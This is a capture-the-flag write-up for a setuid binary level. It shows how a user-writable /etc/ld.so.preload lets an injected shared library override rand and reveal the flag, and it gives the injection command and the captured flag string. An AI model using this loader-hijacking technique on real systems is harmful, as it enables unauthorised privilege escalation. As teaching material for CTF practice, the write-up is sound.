# Level 4

`level4` is, yet again, a `setuid` binary.

```shell
> ls -l $(which level4) && file $(which level4)
```

```
-rwsr-sr-x 1 level4 users 7599 Oct 6 17:58 level4
level4: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.32,
 BuildID[sha1]=6a7a5309f0563cc7ccfbfd6997233206bad635f9, not stripped
```

---

Running it gives us the current date and a supposed random number.

```shell
> level4
```

```
It's 18:48:49 on 06-10-2014. 
Your random number of the day is 1470193859.
```

---

`strings` does not reveal anything interesting, and neither does `ltrace`.

```shell
> strings $(which level4)
```

```
/lib64/ld-linux-x86-64.so.2
jzS	
libc.so.6
srand
puts
strftime
printf
localtime
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-p
fffff.
AWAVA
AUATL
[]A\A]A^A_
It's %H:%M:%S on %d-%m-%Y. 
Your random number of the day is %d.
;*3$"
```

```shell
> ltrace $(which level4)
```

```
__libc_start_main(0x4005c0, 1, 0x7fffea7f83a8, 0x400720 <unfinished ...>
time(0)                                                                 = 1412592529
srand(0x54327391, 0x7fffea7f83a8, 0x7fffea7f83b8, 0)                    = 0
time(0x7fffea7f8268)                                                    = 1412592529
localtime(0x7fffea7f8268)                                               = 0x7f5964168a60
strftime("It's 18:48:49 on 06-10-2014. ", 80, "It's %H:%M:%S on %d-%m-%Y. ", 0x7f5964168a60) = 29
puts("It's 18:48:49 on 06-10-2014. "It's 18:48:49 on 06-10-2014. 
)                                   = 30
rand(0, 0x7f5964389000, 0x7f5964165a40, -1)                             = 0x7dd08b8a
printf("Your random number of the day is"..., 2110819210Your random number of the day is 2110819210.
)               = 45
+++ exited (status 0) +++
```

---

After three levels of application-induced vulnerabilities, it was time to bowl a googly.
Progress at this point requires knowledge of the dynamic loader on GNU/Linux
(called `ld.so`, but technically `ld-linux.so.{1,2}`).


Experienced CTF-ers would attempt to inject a library into the `level4`'s runtime via `LD_PRELOAD`.
Using the `LD_PRELOAD` environment variable would typically forcibly load and link the listed libraries
to any executed binary.

However, under modern systems, the `ld.so`'s response to any attempt to `LD_PRELOAD` a setuid binary
is [something like this](https://www.youtube.com/watch?v=gvdf5n-zI14).

```shell
> LD_PRELOAD=/tmp/inject.so level4
```

```
It's 18:48:49 on 06-10-2014. 
Your random number of the day is 1470193859.
```

---

Anyone familiar with `ld.so`, or who read the manual pages of `ld.so` would also be familiar with
`/etc/ld.so.preload`:

```
/etc/ld.so.preload
       File containing a whitespace-separated list of ELF shared libraries to be loaded before the program.
```

`/etc/ld.so.preload` usually does not exist on a system, and if it does, it is only writable by root,
and so it is deemed "secure" by `ld.so`. Thus, libraries listed within are pre-loaded even when
executing `setuid` binaries.

The solution to level4 is to notice that the target system is poorly-configured.
`/etc.ld.so.preload` does exist, and is writable by users.

```shell
> ls -l /etc/ld.so.preload
```

```
-rw-rw-r-- 1 root users 0 Oct 6 19:14 /etc/ld.so.preload
```

---

Pre-loading a shared library gives us the flag.

```shell
> echo "$PWD/inject.so" > /etc/ld.so.preload && level4 && echo '' > /etc/ld.so.preload
```

```
It's 18:48:49 on 06-10-2014. 
aMahxaexi7cai8usahthoo8Niemoorietie2aen6
Your random number of the day is 0.
```

\#win

## Note

The `rand` function was overwritten because it would have the least impact on any other
executables that launch while the shared object is listed in `ld.so.preload`.

During Geekcamp 2014, participants overwrote various functions, including `__attribute__((constructor))`
and core glibc functions with a function that calls `system`.
`system`, unfortunately, runs a shell, which (because of the preload) attempts to call `system` itself,
ad ~~infinitum~~ forkbombum.

In a case where each participant is given a target machine, this can be somewhat amusing since a player who has
almost captured the final flag could be thwarted by killing his target machine. To exploit this "feature", 
one could have a `/home/level4/.finalflag` or similar, the existence of which should not be known
to participants until they log in as the level4 user.
